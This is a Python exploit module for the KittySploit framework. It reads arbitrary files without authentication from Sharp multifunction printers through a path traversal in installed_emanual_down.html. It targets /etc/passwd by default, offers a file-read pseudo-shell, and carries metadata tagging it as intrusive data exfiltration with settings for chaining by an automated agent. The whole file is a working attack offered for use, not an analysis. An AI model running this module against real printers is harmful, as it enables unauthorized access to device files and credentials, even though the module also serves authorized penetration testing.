#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Sharp MFP pre-auth local file inclusion — arbitrary file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "Sharp MFP Pre-Auth LFI File Read",
        "description": (
            "Reads arbitrary files from Sharp multifunction printers via "
            "installed_emanual_down.html. Pairs with scanner/http/sharp_printers_lfi_detect."
        ),
        "author": ["Pierre Kim", "KittySploit Team"],
        "platform": Platform.LINUX,
        "references": [
            "https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html#pre-auth-lfi",
            "https://jvn.jp/en/vu/JVNVU93051062/index.html",
        ],
        "tags": ["sharp", "printer", "mfp", "lfi", "file-read", "unauth"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "requires": {
                "tech_hints_any": ["sharp"],
                "endpoint_pattern_any": ["/installed_emanual_down.html"],
            },
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "pre-auth LFI"}],
                "suggested_followups": ["scanner/http/sharp_printers_lfi_detect"],
            },
        },
    }

    port = OptPort(80, "Sharp MFP HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    traversal = OptString(
        "/manual/../../../",
        "Prefix inserted after path= (traversal to printer root)",
        False,
        advanced=True,
    )
    file_read = OptString("/etc/passwd", "Remote file path to read", True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    def execute(self, file_path: str) -> str:
        prefix = str(self.traversal or "/manual/../../../").strip()
        remote = str(file_path or "").lstrip("/")
        path = f"/installed_emanual_down.html?path={prefix}{remote}"
        response = self.http_request(
            method="GET",
            path=path,
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response or int(response.status_code or 0) != 200:
            return ""
        return response.text or ""

    def run(self):
        if bool(self.shell_lfi):
            print_status("Sharp MFP LFI pseudo-shell")
            self.handler_lfi()
            return True

        target = str(self.file_read or "/etc/passwd").strip()
        print_status(f"Reading {target} via Sharp MFP LFI")
        data = self.execute(target)
        if not data:
            print_error("File read failed or returned empty body")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
